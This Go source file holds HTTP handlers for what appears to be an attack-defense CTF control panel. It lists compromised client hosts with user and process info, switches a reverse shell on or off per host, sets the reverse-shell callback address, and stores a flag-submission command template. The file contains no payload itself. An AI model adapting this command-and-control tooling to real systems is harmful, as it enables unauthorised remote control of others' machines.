package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
)

func getMessages(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT timestamp, message_type, title, content FROM messages ORDER BY timestamp DESC")
	if err != nil {
		log.Printf("查询消息失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var messages []Message
	for rows.Next() {
		var msg Message
		err := rows.Scan(&msg.Timestamp, &msg.MessageType, &msg.Title, &msg.Content)
		if err != nil {
			log.Printf("扫描消息失败: %v", err)
			continue
		}
		messages = append(messages, msg)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(messages)
}

func clearMessages(w http.ResponseWriter, r *http.Request) {
	_, err := db.Exec("DELETE FROM messages")
	if err != nil {
		log.Printf("清理消息失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	addMessage("info", "消息已清理", "所有历史消息已清除")
	w.WriteHeader(http.StatusOK)
}

func getClients(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT ip, hostname, userinfo, processinfo, last_seen, revshell FROM clients ORDER BY last_seen DESC")
	if err != nil {
		log.Printf("查询客户端失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var clients []Client
	for rows.Next() {
		var client Client
		err := rows.Scan(&client.IP, &client.Hostname, &client.UserInfo,
			&client.ProcessInfo, &client.LastSeen, &client.RevShell)
		if err != nil {
			log.Printf("扫描客户端失败: %v", err)
			continue
		}
		clients = append(clients, client)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clients)
}

func setClient(w http.ResponseWriter, r *http.Request) {
	ip := r.URL.Query().Get("ip")
	revShellStr := r.URL.Query().Get("revshell")

	if ip == "" || revShellStr == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	revShell, err := strconv.Atoi(revShellStr)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	if revShell != 0 && revShell != 1 {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("revshell must be 0 or 1"))
		return
	}

	_, err = db.Exec("UPDATE clients SET revshell = ? WHERE ip = ?", revShell, ip)
	if err != nil {
		log.Printf("更新客户端反弹shell信息失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	action := "禁用"
	if revShell == 1 {
		action = "启用"
	}
	addMessage("info", "客户端状态更新", fmt.Sprintf("IP: %s, 反弹Shell: %s", ip, action))
	w.WriteHeader(http.StatusOK)
}

func setReverseShell(w http.ResponseWriter, r *http.Request) {
	addr := r.URL.Query().Get("addr")
	if addr == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	if err := setConfigValue("revshell_addr", addr); err != nil {
		log.Printf("设置反弹shell地址失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	addMessage("info", "反弹Shell地址更新", fmt.Sprintf("新地址: %s", addr))
	w.WriteHeader(http.StatusOK)
}

// setFlagAPI 已废弃: flag提交现在使用命令模板,不再需要单独设置API地址
// 保留此函数以兼容旧的前端代码,但实际不做任何操作
func setFlagAPI(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Flag提交现在使用命令模板,请使用edit-template接口配置提交命令"))
}

func getTemplate(w http.ResponseWriter, r *http.Request) {
	template := getConfigValue("submit_template")
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(template))
}

func editTemplate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Printf("读取request body失败: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	template := string(body)
	if template == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	if err := setConfigValue("submit_template", template); err != nil {
		log.Printf("设置提交模板失败: %v", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	addMessage("info", "提交命令模板更新", "Flag提交命令已更新，使用 {FLAG} 占位符")
	w.WriteHeader(http.StatusOK)
}
